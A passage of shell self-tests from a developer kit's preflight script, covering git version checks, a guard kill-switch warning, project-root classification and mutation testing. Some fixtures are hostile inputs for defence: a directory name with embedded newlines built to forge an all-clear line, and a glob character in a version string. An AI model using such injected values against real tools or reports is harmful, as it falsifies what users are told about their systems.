  if git_meets_floor 3 0 2>/dev/null; then echo "PASS: 3.0 meets the floor (major above)"; else echo "FAIL: 3.0 rejected (major above floor)"; fail=1; fi

  # the parser: real-world `git --version` shapes -> "MAJOR MINOR"
  out=$(git_version_parts "git version 2.39.5 (Apple Git-154)" 2>&1) || out="<git_version_parts absent/errored>"
  case "$out" in "2 39") echo "PASS: parses 'git version 2.39.5 (Apple Git-154)' -> 2 39";; *) echo "FAIL: Apple git line parsed as '$out'"; fail=1;; esac
  out=$(git_version_parts "git version 2.25.1" 2>&1) || out="<absent>"
  case "$out" in "2 25") echo "PASS: parses 'git version 2.25.1' -> 2 25";; *) echo "FAIL: 2.25.1 parsed as '$out'"; fail=1;; esac
  out=$(git_version_parts "git version 2.9.5" 2>&1) || out="<absent>"
  case "$out" in "2 9") echo "PASS: parses 'git version 2.9.5' -> 2 9";; *) echo "FAIL: 2.9.5 parsed as '$out'"; fail=1;; esac
  out=$(git_version_parts "git version 2.41.0.windows.3" 2>&1) || out="<absent>"
  case "$out" in "2 41") echo "PASS: parses the Windows build string -> 2 41";; *) echo "FAIL: windows line parsed as '$out'"; fail=1;; esac
  if git_version_parts "git version banana" >/dev/null 2>&1; then echo "FAIL: unparseable version accepted"; fail=1; else echo "PASS: unparseable version rejected (rc 1)"; fi

  # the check: below the floor -> WARN naming the version AND the fallback (the escape)
  out=$(PREFLIGHT_GIT_VERSION_CMD='echo git version 2.25.1' check_git_capability 2>&1) || out="<check_git_capability absent/errored>"
  case "$out" in *warn*2.25*) echo "PASS: old git warns and names the version found";; *) echo "FAIL: old git did not warn with its version ($out)"; fail=1;; esac
  case "$out" in *fallback*) echo "PASS: old-git warning names the temporary-worktree fallback (the escape)";; *) echo "FAIL: warning does not name the fallback ($out)"; fail=1;; esac
  case "$out" in *non-mutating*) echo "PASS: old-git warning states the fallback is still non-mutating";; *) echo "FAIL: warning does not state non-mutating ($out)"; fail=1;; esac

  # 2.9 is the trap case end-to-end, not just in the comparator
  out=$(PREFLIGHT_GIT_VERSION_CMD='echo git version 2.9.5' check_git_capability 2>&1) || out="<absent>"
  case "$out" in *warn*2.9*fallback*) echo "PASS: git 2.9.5 warns (a string compare would have passed it)";; *) echo "FAIL: git 2.9.5 not warned ($out)"; fail=1;; esac

  # at/above the floor -> ok, no warning
  out=$(PREFLIGHT_GIT_VERSION_CMD='echo git version 2.38.0' check_git_capability 2>&1) || out="<absent>"
  case "$out" in *ok*2.38*) echo "PASS: git 2.38.0 ok (boundary)";; *) echo "FAIL: git 2.38.0 not ok ($out)"; fail=1;; esac
  out=$(PREFLIGHT_GIT_VERSION_CMD='echo git version 2.48.1' check_git_capability 2>&1) || out="<absent>"
  case "$out" in *ok*merge-tree*) echo "PASS: modern git ok and names merge-tree";; *) echo "FAIL: modern git not ok ($out)"; fail=1;; esac

  # degrade, never crash: unparseable / absent git -> skip
  out=$(PREFLIGHT_GIT_VERSION_CMD='echo git version banana' check_git_capability 2>&1) || out="<absent>"
  case "$out" in *skip*) echo "PASS: unparseable git version degrades to skip";; *) echo "FAIL: unparseable version not skipped ($out)"; fail=1;; esac
  out=$(PREFLIGHT_GIT_VERSION_CMD='false' check_git_capability 2>&1) || out="<absent>"
  case "$out" in *skip*) echo "PASS: unavailable git degrades to skip";; *) echo "FAIL: absent git not skipped ($out)"; fail=1;; esac

  # WARN-only invariant: the floor is advisory — it must NEVER set miss (i.e. never fail the run)
  miss=0; PREFLIGHT_GIT_VERSION_CMD='echo git version 2.25.1' check_git_capability >/dev/null 2>&1 || true
  if [ "$miss" -eq 0 ]; then echo "PASS: git-floor warn leaves miss untouched"; else echo "FAIL: git-floor warn set miss (hard-failed old git)"; fail=1; fi
  miss=0

  # NO AMBIENT SPOOF (flag-not-env): in a REAL run — no --selftest, no --selftest-e2e — an ambient
  # PREFLIGHT_GIT_VERSION_CMD must be IGNORED. The seam exists for the tests; if the environment alone
  # can redirect it, a stale/hostile export in an adopter's shell rewrites what preflight reports about
  # their machine. Advisory-only, so no privilege boundary is crossed — but it is the same flag-not-env
  # rule --date honors (an ambient INCEPT_DATE was rejected for exactly this reason), and a check that
  # can be told what to see is not a check.
  #
  # MARKER, NOT VERSION-STRING: the seam command TOUCHES a file, and we assert the file was not created.
  # Keying on the OUTPUT instead (`case "$spoof" in *"git 2.25"*)`) reads the HOST's git: a machine whose
  # real git is 2.25.x — Ubuntu 20.04, the exact platform this floor was written for — legitimately prints
  # `warn git 2.25 ...`, and the assertion would call its own honest report an attack. CI (git 2.4x) would
  # never see it. A false-RED generator is the same defect class as a vacuous green, inverted. So assert
  # the CLAIM ("did the seam command RUN?") rather than a proxy the environment is allowed to satisfy.
  _sd=$(mktemp -d); _marker="$_sd/ran"
  printf '#!/bin/sh\ntouch "%s"\necho git version 2.25.1\n' "$_marker" > "$_sd/fakegit"
  chmod +x "$_sd/fakegit"
  # R7: CI=1 keeps this real run off the network (under CI the declaration is not read, so origin is never contacted)
  _ign_o=$(env CI=1 PREFLIGHT_GIT_VERSION_CMD="$_sd/fakegit" PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' sh "$0" 2>&1 </dev/null) || true
  # SWAS-784 liveness: this run is on the kit cwd, which reads kit (a notice, then the report). The marker's absence proves nothing unless the body ran past the class line.
  case "$_ign_o" in *"Universal prerequisites:"*) : ;; *) echo "FAIL: the ambient git-version cell never ran the real body (vacuous): $_ign_o"; fail=1 ;; esac
  if [ -e "$_marker" ]; then
    echo "FAIL: an AMBIENT PREFLIGHT_GIT_VERSION_CMD was honored in a real run (env, not flag)"; fail=1
  else
    echo "PASS: a real run IGNORES an ambient PREFLIGHT_GIT_VERSION_CMD (the seam needs an explicit flag)"
  fi
  rm -rf "$_sd"

  # SWAS-361 (352g F10): the kill-switch line. Set to "1" -> exactly ONE FAIL line naming what is lost; unset or "0" -> nothing;
  # the exit code does not move; and the guard's truthiness is mirrored, so a coupling cell reds if the guard's definition moves.
  out=$(KIT_GUARD_SELFEDIT=1 check_guard_killswitch 2>&1)
  case "$out" in
    *"FAIL KIT_GUARD_SELFEDIT=1"*"every guard refusal is OFF"*"deny log"*) echo "PASS: kill-switch exported prints a FAIL line naming what is lost" ;;
    *) echo "FAIL: kill-switch exported did not print the FAIL line ($out)"; fail=1 ;;
  esac
  _ks_n=$(printf '%s\n' "$out" | grep -c 'FAIL KIT_GUARD_SELFEDIT')
  if [ "$_ks_n" -eq 1 ]; then echo "PASS: exactly one kill-switch line"; else echo "FAIL: kill-switch line count $_ks_n, not 1"; fail=1; fi
  out=$(KIT_GUARD_SELFEDIT=0 check_guard_killswitch 2>&1)
  if [ -z "$out" ]; then echo "PASS: kill-switch value 0 prints nothing"; else echo "FAIL: kill-switch value 0 printed ($out)"; fail=1; fi
  out=$(unset KIT_GUARD_SELFEDIT; check_guard_killswitch 2>&1)
  if [ -z "$out" ]; then echo "PASS: kill-switch unset prints nothing"; else echo "FAIL: kill-switch unset printed ($out)"; fail=1; fi
  _ks_rc_on=0; _ks_rc_off=0
  KIT_GUARD_SELFEDIT=1 sh "$0" --selftest-e2e --boundary-advisory >/dev/null 2>&1 || _ks_rc_on=$?
  env -u KIT_GUARD_SELFEDIT sh "$0" --selftest-e2e --boundary-advisory >/dev/null 2>&1 || _ks_rc_off=$?
  if [ "$_ks_rc_on" -eq "$_ks_rc_off" ]; then echo "PASS: the kill-switch line leaves the exit code unchanged"; else echo "FAIL: the kill-switch line moved the exit ($_ks_rc_off -> $_ks_rc_on)"; fail=1; fi
  if KIT_GUARD_SELFEDIT=1 sh "$0" --selftest-e2e --boundary-advisory 2>&1 | grep -q 'FAIL KIT_GUARD_SELFEDIT=1'; then echo "PASS: the kill-switch line is wired into the real body"; else echo "FAIL: the kill-switch line is not wired into the real body (defined-but-uncalled)"; fail=1; fi
  # SWAS-361 load-bearing mutants: a sed mutation of a TEMP COPY of this script; the copy must no longer do the job (the cell would be
  # red), and the mutation MUST apply (a vacuous mutant proves nothing).
  _ks_mut() {  # <name> <sed expr> <env-value> <must-print: 1|0> : run the mutated copy's real body; FAIL if it behaves like the original
    _ks_m=$(mktemp -d)
    sed "$2" "$0" > "$_ks_m/preflight.sh"; cp "$(dirname -- "$0")/incept.sh" "$_ks_m/incept.sh"   # SWAS-784: the copy reads the marker list from the incept.sh beside it
    if cmp -s "$0" "$_ks_m/preflight.sh"; then echo "FAIL: mutant $1 did not apply (the sed expression matched nothing)"; fail=1; rm -rf "$_ks_m"; return 0; fi
    _ks_o=$(KIT_GUARD_SELFEDIT="$3" sh "$_ks_m/preflight.sh" --selftest-e2e --boundary-advisory 2>&1) || true
    case "$_ks_o" in *"Recommended (GitHub-based flows"*) : ;; *) echo "FAIL: mutant $1 never ran the real body past the kill-switch call (vacuous)"; fail=1 ;; esac
    _ks_hit=0; case "$_ks_o" in *"FAIL KIT_GUARD_SELFEDIT"*) _ks_hit=1 ;; esac
    if [ "$_ks_hit" -eq "$4" ]; then echo "FAIL: mutant $1 survived (the kill-switch cell would stay green)"; fail=1; else echo "PASS: mutant $1 is killed"; fi
    rm -rf "$_ks_m"
  }
  _ks_mut killswitch-uncalled 's/^check_guard_killswitch$/:/' 1 1
  _ks_mut truthiness-nonempty 's/\[ "${KIT_GUARD_SELFEDIT:-0}" = "1" \] || return 0/[ -n "${KIT_GUARD_SELFEDIT:-}" ] || return 0/' 0 0
  _ks_core="$(dirname "$0")/../.claude/hooks/guard-core.sh"
  if [ ! -f "$_ks_core" ]; then
    # On a kit tree (the kit's guard.sh is present) a missing guard-core.sh is a FAIL; elsewhere there is nothing to couple to, and no PASS is claimed.
    if [ -f "$(dirname "$0")/../.claude/hooks/guard.sh" ]; then echo "FAIL: coupling - the kit's guard.sh is present but guard-core.sh is missing, so the selfedit truthiness cannot be checked"; fail=1; fi
  elif grep -qF 'selfedit_allowed() { [ "${KIT_GUARD_SELFEDIT:-0}" = "1" ]; }' "$_ks_core"; then echo "PASS: coupling - the guard's selfedit truthiness is still exactly 1"
  else echo "FAIL: coupling - the guard's selfedit truthiness moved; mirror it in check_guard_killswitch (preflight) and doctor"; fail=1; fi

  # — SWAS-784 / SWAS-785: the tree class, PR1-PR7. Each cell asserts an exit code AND a sentence, and each refusal and notice has a mutant (a sed mutation of a temp copy of
  # this script, with incept.sh beside it so the copy can read the marker list) that must turn the cell red; a mutant that does not apply, or does not parse, is a FAIL.
  _pr_t=$(mktemp -d)
  _pr_run() {  # <dir> <script> [flags...] -> _pr_out, _pr_rc : the real body, seams live, boundary advisory, run from <dir> (every env var a cell sets is set by the cell)
    _prr_d=$1; _prr_s=$2; shift 2
    _pr_rc=0
    _pr_out=$( cd "$_prr_d" && env -u CI -u GITHUB_ACTIONS -u GIT_DIR -u GIT_WORK_TREE PREFLIGHT_GH_CMD=false ACTIONLINT_VALID_CMD=__skip__ sh "$_prr_s" --selftest-e2e --boundary-advisory "$@" 2>&1 </dev/null ) || _pr_rc=$?
  }
  _pr_fx() {  # <name> <kit|export|incepted|other> -> stdout: a fresh fixture directory of that kind
    _prf=$_pr_t/$1; mkdir -p "$_prf"
    case $2 in
      kit)      printf 'Engineering Principles & Definition of Done\n' > "$_prf/CLAUDE.md"; mkdir -p "$_prf/.superpowers" ;;
      export)   printf 'Engineering Principles & Definition of Done\n' > "$_prf/CLAUDE.md" ;;
      incepted) : > "$_prf/ENGINEERING-PRINCIPLES.md"; mkdir -p "$_prf/docs/superpowers" ;;
    esac
    printf '%s\n' "$_prf"
  }
  _pr_has() {  # <needle> -> 0 iff the last _pr_run's output carries it
    case "$_pr_out" in *"$1"*) return 0 ;; *) return 1 ;; esac
  }
  _pr_mut() {  # <name> <sed expr> -> sets _pr_mp (the mutated copy, incept.sh beside it); rc 1 and a FAIL when it did not apply or does not parse
    _prm_d=$(mktemp -d "$_pr_t/mut-XXXXXX"); sed "$2" "$_pr_self" > "$_prm_d/preflight.sh"; cp "$(dirname -- "$_pr_self")/incept.sh" "$_prm_d/incept.sh"
    if cmp -s "$_pr_self" "$_prm_d/preflight.sh"; then echo "FAIL: mutant $1 did not apply (the sed expression matched nothing)"; fail=1; return 1; fi
    if ! sh -n "$_prm_d/preflight.sh" 2>/dev/null; then echo "FAIL: mutant $1 does not parse (a mutant that cannot run would read as killed)"; fail=1; return 1; fi
    _pr_mp=$_prm_d/preflight.sh
  }
  _pr_kill() {  # <name> <sed expr> <fixture dir> <pattern> <hit in the original: 1|0> <empty-list: 1|0> [flags...] : the mutant must flip whether <pattern> is in the output
    _prk_n=$1; _prk_e=$2; _prk_d=$3; _prk_p=$4; _prk_o=$5; _prk_l=$6; shift 6
    _pr_mut "$_prk_n" "$_prk_e" || return 0
    [ "$_prk_l" -eq 0 ] || printf "KIT_INTERNAL_MARKERS=''\n" > "$(dirname -- "$_pr_mp")/incept.sh"
    _pr_run "$_prk_d" "$_pr_mp" "$@"
    if [ -z "$_pr_out" ]; then echo "FAIL: mutant $_prk_n printed nothing (vacuous)"; fail=1; return 0; fi
    if _pr_has "$_prk_p"; then _prk_h=1; else _prk_h=0; fi
    if [ "$_prk_h" -eq "$_prk_o" ]; then echo "FAIL: mutant $_prk_n survived (the pattern '$_prk_p' is in the output: $_prk_h, as in the original)"; fail=1
    else echo "PASS: mutant $_prk_n is killed"; fi
  }

  # PR1 kit: one kit marker plus the principles CLAUDE.md -> the notice, no all-clear, the not-an-all-clear last line, rc 0 (nothing sets miss)
  _prd0=$(_pr_fx pr1 kit); _pr_run "$_prd0" "$_pr_self"
  if _pr_has "this is the Sparkwright kit checkout" && _pr_has "not your project" && _pr_has "sh scripts/adopter-export.sh <dir>" && ! _pr_has "All prerequisites present." \
     && _pr_has "Prerequisites checked on the kit checkout, not a project: this is not an all-clear." && [ "$_pr_rc" -eq 0 ]; then
    echo "PASS: PR1 [kit] a kit checkout prints the kit notice, ends without the all-clear, and exits 0"
  else echo "FAIL: PR1 [kit] a kit checkout did not print the notice and the not-an-all-clear line with rc 0 (rc $_pr_rc): $_pr_out"; fail=1; fi
  _pr_kill pr1-notice-removed '/MUT-PRKITNOTICE$/d' "$_prd0" "this is the Sparkwright kit checkout" 1 0
  _pr_kill pr1-all-clear-restored '/MUT-PRKITLAST$/d' "$_prd0" "All prerequisites present." 0 0
  # PR2 other: an empty directory -> rc 1, the sentence names the cwd, and no report line prints
  _prd0=$(_pr_fx pr2 other); _pr_run "$_prd0" "$_pr_self"
  if [ "$_pr_rc" -eq 1 ] && _pr_has "$(basename -- "$_prd0") is not a project root" && _pr_has "cd to your project's root and re-run." && ! _pr_has "Universal prerequisites" && ! _pr_has "Sparkwright — preflight"; then
    echo "PASS: PR2 [other] a directory that is no project refuses with rc 1, names the cwd, and prints no report line"
  else echo "FAIL: PR2 [other] a directory that is no project did not refuse plainly with rc 1 and no report (rc $_pr_rc): $_pr_out"; fail=1; fi
  _pr_kill pr2-refusal-dropped '/MUT-PROTHER$/d' "$_prd0" "is not a project root" 1 0
  # PR3 export: the principles CLAUDE.md and no marker -> unchanged: the all-clear, rc 0, and no class sentence (the non-vacuity anchor: the class does not refuse everything)
  _prd0=$(_pr_fx pr3 export); _pr_run "$_prd0" "$_pr_self"
  if [ "$_pr_rc" -eq 0 ] && _pr_has "All prerequisites present." && ! _pr_has "kit checkout" && ! _pr_has "is not a project root"; then
    echo "PASS: PR3 [export] an export is unchanged: the all-clear, rc 0, no class sentence"
  else echo "FAIL: PR3 [export] an export did not keep its all-clear with rc 0 (rc $_pr_rc): $_pr_out"; fail=1; fi
  # PR4 incepted: ENGINEERING-PRINCIPLES.md plus a docs/superpowers directory (a kit marker a plugin may create) -> read as incepted, output unchanged. Pins the order.
  _prd0=$(_pr_fx pr4 incepted); _pr_run "$_prd0" "$_pr_self"
  if [ "$_pr_rc" -eq 0 ] && _pr_has "All prerequisites present." && ! _pr_has "kit checkout" && ! _pr_has "is not a project root"; then
    echo "PASS: PR4 [incepted] an incepted tree holding docs/superpowers is read as incepted: the all-clear, rc 0, no kit notice"
  else echo "FAIL: PR4 [incepted] an incepted tree holding a kit marker was not read as incepted (rc $_pr_rc): $_pr_out"; fail=1; fi
  _pr_kill pr4-incepted-not-first '/MUT-PRINC$/d' "$_prd0" "this is the Sparkwright kit checkout" 0 0
  # PR5 list unreadable: no incept.sh beside the script, then an incept.sh whose list line is empty -> rc 1 and the reinstall sentence, never an export reading
  mkdir -p "$_pr_t/pr5-bare" "$_pr_t/pr5-empty"; cp "$_pr_self" "$_pr_t/pr5-bare/preflight.sh"; cp "$_pr_self" "$_pr_t/pr5-empty/preflight.sh"
  printf "KIT_INTERNAL_MARKERS=''\n" > "$_pr_t/pr5-empty/incept.sh"
  _prd0=$(_pr_fx pr5 export)
  for _pr5 in bare empty; do
    _pr_run "$_prd0" "$_pr_t/pr5-$_pr5/preflight.sh"
    if [ "$_pr_rc" -eq 1 ] && _pr_has "cannot read the kit-internal marker list in" && _pr_has "reinstall the kit scripts" && ! _pr_has "All prerequisites present."; then
      echo "PASS: PR5 [list-$_pr5] an unreadable or empty marker list refuses with rc 1 and the reinstall sentence, never an export reading"
    else echo "FAIL: PR5 [list-$_pr5] an unreadable or empty marker list did not refuse (rc $_pr_rc): $_pr_out"; fail=1; fi
  done
  _pr_kill pr5-empty-list-passes '/MUT-PRLIST$/d' "$_prd0" "cannot read the kit-internal marker list" 1 1
  # PR6 nested: a subdirectory of an incepted repo, run with --allow-nested -> classified by its repo (incepted), not refused by the class
  _prd0=$(_pr_fx pr6 incepted); ( cd "$_prd0" && git init -q ); mkdir -p "$_prd0/pkg"; _pr_run "$_prd0/pkg" "$_pr_self" --allow-nested
  # rc 1 here is the incepted tree's own pre-push-guard refusal (the fixture is an incepted repo with no hook, and a nested run offers no install): the whole body ran, so the class did not refuse
  if [ "$_pr_rc" -eq 1 ] && ! _pr_has "is not a project root" && ! _pr_has "kit checkout" && _pr_has "Universal prerequisites:" && _pr_has "pre-push runtime guard is not in force"; then
    echo "PASS: PR6 [nested] a --allow-nested package of an incepted repo is classified by its repo and not refused by the class (rc 1, from the pre-push guard check that only an incepted tree meets)"
  else echo "FAIL: PR6 [nested] a --allow-nested package of an incepted repo was refused or misread by the class (rc $_pr_rc): $_pr_out"; fail=1; fi
  _pr_kill pr6-no-toplevel-fallback '/MUT-PRFALLBACK$/s/\[ -n "\$_prs_t" \]/false/' "$_prd0/pkg" "is not a project root" 0 0 --allow-nested
  # PR6b nested export (the errata): a package that is itself an export (the principles CLAUDE.md) inside a parent git repo that is no project -> reads export by itself, is not refused, rc 0
  _prd0=$(_pr_fx pr6b other); ( cd "$_prd0" && git init -q ); : > "$_prd0/.keep"; mkdir -p "$_prd0/pkg"; printf 'Engineering Principles & Definition of Done\n' > "$_prd0/pkg/CLAUDE.md"
  _pr_run "$_prd0/pkg" "$_pr_self" --allow-nested
  if [ "$_pr_rc" -eq 0 ] && ! _pr_has "is not a project root" && ! _pr_has "kit checkout" && _pr_has "All prerequisites present."; then
    echo "PASS: PR6b [nested-export] an export package in a parent repo that is no project reads export by itself: not refused, the all-clear, rc 0"
  else echo "FAIL: PR6b [nested-export] an export package in a parent repo that is no project was refused or misread (rc $_pr_rc): $_pr_out"; fail=1; fi
  _pr_kill pr6b-toplevel-first '/MUT-PRPWD$/s/project_root_class "\$PWD"/project_root_class "${_prs_t:-$PWD}"/' "$_prd0/pkg" "is not a project root" 0 0 --allow-nested
  # PR6c: PR6b with .superpowers at the parent (a plugin's marker at a monorepo root, no principles CLAUDE.md there) -> that root is not the kit root: no refusal, no kit notice
  _prd0=$(_pr_fx pr6c other); ( cd "$_prd0" && git init -q ); mkdir -p "$_prd0/.superpowers" "$_prd0/pkg"; printf 'Engineering Principles & Definition of Done\n' > "$_prd0/pkg/CLAUDE.md"
  _pr_run "$_prd0/pkg" "$_pr_self" --allow-nested
  if [ "$_pr_rc" -eq 0 ] && ! _pr_has "is not a project root" && ! _pr_has "kit checkout" && _pr_has "All prerequisites present."; then
    echo "PASS: PR6c [nested-plugin] a package under a plugin-marked parent (no principles CLAUDE.md there) is not refused and gets no kit notice"
  else echo "FAIL: PR6c [nested-plugin] a package under a plugin-marked parent was refused or read as the kit (rc $_pr_rc): $_pr_out"; fail=1; fi
  _pr_kill pr6c-kit-root-needs-no-claude '/MUT-PRKROOT$/s/prc_is_principles "\$1"/true/' "$_prd0/pkg" "kit checkout" 0 0 --allow-nested
  # PR8 kit subdirectory: a subdirectory of a kit-shaped repo (a marker and the principles CLAUDE.md at its root) that itself holds a principles CLAUDE.md, with --allow-nested
  # -> the kit root wins: the notice, the not-an-all-clear last line, never the all-clear, rc 0
  _prd0=$(_pr_fx pr8 kit); ( cd "$_prd0" && git init -q ); mkdir -p "$_prd0/sub"; printf 'Engineering Principles & Definition of Done\n' > "$_prd0/sub/CLAUDE.md"
  _pr_run "$_prd0/sub" "$_pr_self" --allow-nested
  if [ "$_pr_rc" -eq 0 ] && _pr_has "this is the Sparkwright kit checkout" && _pr_has "Prerequisites checked on the kit checkout, not a project: this is not an all-clear." && ! _pr_has "All prerequisites present."; then
    echo "PASS: PR8 [kit-subdir] a subdirectory of the kit checkout holding a principles CLAUDE.md reads kit: the notice, the not-an-all-clear line, rc 0"
  else echo "FAIL: PR8 [kit-subdir] a subdirectory of the kit checkout was not read as the kit (rc $_pr_rc): $_pr_out"; fail=1; fi
  _pr_kill pr8-kit-root-rule-dropped '/MUT-PRKROOT1$/d' "$_prd0/sub" "All prerequisites present." 0 0 --allow-nested
  # PR7 hostile path: a fixture directory whose name holds newlines that would forge the all-clear -> <unprintable path>, and no forged line. The name is built at runtime so that an
  # unguarded print puts "All prerequisites present." alone on a line of its own (an exact match for the all-clear), not inside a longer line.
  _pr7=$(printf '\nAll prerequisites present.\nz')
  _prd0="$_pr_t/pr7-$_pr7"; mkdir -p "$_prd0"; printf 'Engineering Principles & Definition of Done\n' > "$_prd0/CLAUDE.md"; mkdir -p "$_prd0/.superpowers"
  _pr_run "$_prd0" "$_pr_self"
  if _pr_has "(<unprintable path>)" && ! printf '%s\n' "$_pr_out" | grep -qx 'All prerequisites present.'; then
    echo "PASS: PR7 [hostile-kit] a newline in the directory name prints <unprintable path> and forges no all-clear line"
  else echo "FAIL: PR7 [hostile-kit] a newline in the directory name was printed or forged a line: $_pr_out"; fail=1; fi
  _pr_kill pr7-hostile-unguarded '/MUT-PRHOSTILE$/s/guard_path_hostile "\$1"/false/' "$_prd0" "<unprintable path>" 1 0
  _pr_mut pr7-hostile-forges-line '/MUT-PRHOSTILE$/s/guard_path_hostile "\$1"/false/' && { _pr_run "$_prd0" "$_pr_mp"
    if printf '%s\n' "$_pr_out" | grep -qx 'All prerequisites present.'; then echo "PASS: mutant pr7-hostile-forges-line is killed (unguarded, the name forges an exact all-clear line, so the PR7 assertion has teeth)"
    else echo "FAIL: mutant pr7-hostile-forges-line forged no exact all-clear line (the PR7 fixture cannot catch a forgery): $_pr_out"; fail=1; fi; }
  _prd7b="$_pr_t/pr7b-$_pr7"; mkdir -p "$_prd7b"; _pr_run "$_prd7b" "$_pr_self"
  if [ "$_pr_rc" -eq 1 ] && _pr_has "<unprintable path> is not a project root" && ! printf '%s\n' "$_pr_out" | grep -qx 'All prerequisites present.'; then
    echo "PASS: PR7 [hostile-other] the refusal names <unprintable path> for a newline in the directory name"
  else echo "FAIL: PR7 [hostile-other] the refusal printed a hostile path (rc $_pr_rc): $_pr_out"; fail=1; fi
  _pr_kill pr7-hostile-other-unguarded '/MUT-PRHOSTILE$/s/guard_path_hostile "\$1"/false/' "$_prd7b" "<unprintable path> is not a project root" 1 0
  _pr_mut pr7-hostile-other-forges-line '/MUT-PRHOSTILE$/s/guard_path_hostile "\$1"/false/' && { _pr_run "$_prd7b" "$_pr_mp"
    if printf '%s\n' "$_pr_out" | grep -qx 'All prerequisites present.'; then echo "PASS: mutant pr7-hostile-other-forges-line is killed (unguarded, the refusal forges an exact all-clear line)"
    else echo "FAIL: mutant pr7-hostile-other-forges-line forged no exact all-clear line (the PR7 fixture cannot catch a forgery): $_pr_out"; fail=1; fi; }

  # NO GLOB: the version line is word-SPLIT, never pathname-expanded. `for _w in $1` unquoted splits AND
  # globs; a '*' in the string would expand against the CWD, so a file named e.g. '9.9.9' sitting in the
  # working directory becomes the "version" — a floor that reads the filesystem instead of git. (Quoting
  # $1 is not the fix: it would collapse the line to one word and parse nothing. Disabling globbing is.)
  _gt=$(mktemp -d)
  : > "$_gt/9.9.9"
  out=$( cd "$_gt" && git_version_parts "git version * 2.25.1" 2>&1 ) || out="<absent>"
  case "$out" in
    "2 25") echo "PASS: a '*' in the version line does NOT glob against the cwd (2 25, not the filename)" ;;
    *) echo "FAIL: the version line was GLOB-expanded — parsed '$out' from the filesystem"; fail=1 ;;
  esac
  rm -rf "$_gt"

  # WIRED end-to-end: a REAL preflight run (not just the unit seam) must name the git version and,
  # below the floor, the fallback — and must not change the run's verdict. A defined-but-uncalled check
  # is decorative. `--selftest-e2e` runs the REAL body with the injection seams live (the flag IS the
  # authorization — see the no-ambient-spoof assert above).
  e2e_rc=0
  e2e=$(PREFLIGHT_GIT_VERSION_CMD='echo git version 2.25.1' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' sh "$0" --selftest-e2e --boundary-advisory 2>&1) || e2e_rc=$?
  case "$e2e" in *warn*2.25*fallback*) echo "PASS: real preflight run names the git version + the fallback";; *) echo "FAIL: real run did not surface the git floor (rc=$e2e_rc)"; fail=1;; esac
  # DIFFERENTIAL, not absolute: `[ "$e2e_rc" -eq 0 ]` would assert a whole preflight run exits 0, which
  # folds in the AMBIENT environment (the CP-4 non-root refusal, a missing jq) — it reddens for reasons
  # that have nothing to do with the git floor. A false-RED generator is the same defect class as a
  # vacuous green, inverted. The claim is "the floor is ADVISORY", so assert exactly that: an old git
  # does not CHANGE preflight's exit code, whatever that code is in this environment.
  new_rc=0
  PREFLIGHT_GIT_VERSION_CMD='echo git version 2.48.1' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' sh "$0" --selftest-e2e --boundary-advisory >/dev/null 2>&1 || new_rc=$?
  if [ "$e2e_rc" -eq "$new_rc" ]; then echo "PASS: the git floor does not change preflight's exit code (advisory, not blocking)"; else echo "FAIL: old git CHANGED the exit code (old=$e2e_rc modern=$new_rc)"; fail=1; fi

  # — SWAS-793: the summary line's numbers match the lines printed, and each number names its own kind. The REAL body, in an export-shaped fixture (the `_pr_xp` shape: the principles
  # CLAUDE.md, a typescript-node .nvmrc) that is also a git repository so the checkout report runs: a github origin (so the repo-class and CODEOWNERS checks run), a CODEOWNERS with an
  # @your-org placeholder, a core.hooksPath that points inside the checkout (one git-plants warning), a stub `gh` on PATH (recommend gh and gh auth read PATH, and the same stub answers the KIT_ATTEST_PRIVATE variable read that sets `repo_attest_state`; PREFLIGHT_GH_CMD reaches
  # only check_repo_class), the git-version and node seams, and CI plus PREFLIGHT_TTY_SEAM=1 (the boundary prints its CI-in-a-terminal WARN; the fake origin could not be fetched, so the
  # declaration seam is @absent). HOME, the sandbox seams and the git config are pinned. The assertion is machine-independent: each number in the summary is compared with the count of its
  # own kind of line in the SAME output (advisory = `  warn ` lines that are not git-plants, boundary or egress; boundary = `  WARN`/`  warn` boundary and egress lines; git-plants =
  # `  warn git-plants:` lines), never with a fixed literal. Each kind must also be above 0 here (and the advisory count above 1), or the cell proves nothing.
  _sm_d=$(mktemp -d); _sm_h=$_sm_d/home; _sm_w=$_sm_d/work
  _sm_g() { env -i PATH="$PATH" HOME="$_sm_h" GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null git "$@"; }   # the fixture build: no developer config
  mkdir -p "$_sm_h" "$_sm_d/bin" "$_sm_w/.github" "$_sm_w/profiles/typescript-node/scaffold"
  printf 'Engineering Principles & Definition of Done\n' > "$_sm_w/CLAUDE.md"; printf '24\n' > "$_sm_w/profiles/typescript-node/scaffold/.nvmrc"; printf '* @your-org/team\n' > "$_sm_w/.github/CODEOWNERS"
  printf '#!/bin/sh\nexit 0\n' > "$_sm_d/bin/gh"; chmod +x "$_sm_d/bin/gh"
  _sm_run() {  # <script> -> _sm_out: the real body in the fixture
    _sm_out=$(cd "$_sm_w" && env -i PATH="$_sm_d/bin:$PATH" HOME="$_sm_h" GIT_CONFIG_NOSYSTEM=1 CI=true PREFLIGHT_TTY_SEAM=1 PREFLIGHT_GH_CMD='printf {"isPrivate":true,"isInOrganization":false}' \
      PREFLIGHT_GIT_VERSION_CMD='echo git version 2.25.1' PREFLIGHT_NODE_VERSION_CMD=false ACTIONLINT_VALID_CMD=__skip__ PREFLIGHT_BOUNDARY_OPTOUT=@absent \
      PREFLIGHT_SANDBOX_SETTINGS="$_sm_d/none" PREFLIGHT_SANDBOX_LOCAL="$_sm_d/none" PREFLIGHT_SANDBOX_USER="$_sm_d/none" PREFLIGHT_SANDBOX_MANAGED="$_sm_d/none" PREFLIGHT_SANDBOX_OS=Darwin PREFLIGHT_SANDBOX_TOOLS=sandbox-exec PREFLIGHT_SANDBOX_BWRAP_OK=1 \
      sh "$1" --selftest-e2e --boundary-advisory --stack typescript-node 2>&1 </dev/null) || :
  }
  _sm_check() {  # <label> -> sets _sm_res to ok, or the reason the summary does not match the lines above it
    _sm_nr=$(printf '%s\n' "$_sm_out" | awk '/^  warn / && !/^  warn (git-plants|boundary|egress):/ { n++ } END { print n + 0 }')
    _sm_nb=$(printf '%s\n' "$_sm_out" | awk '/^  WARN (boundary|egress):/ || /^  warn (boundary|egress):/ { n++ } END { print n + 0 }')
    _sm_ng=$(printf '%s\n' "$_sm_out" | awk '/^  warn git-plants:/ { n++ } END { print n + 0 }')
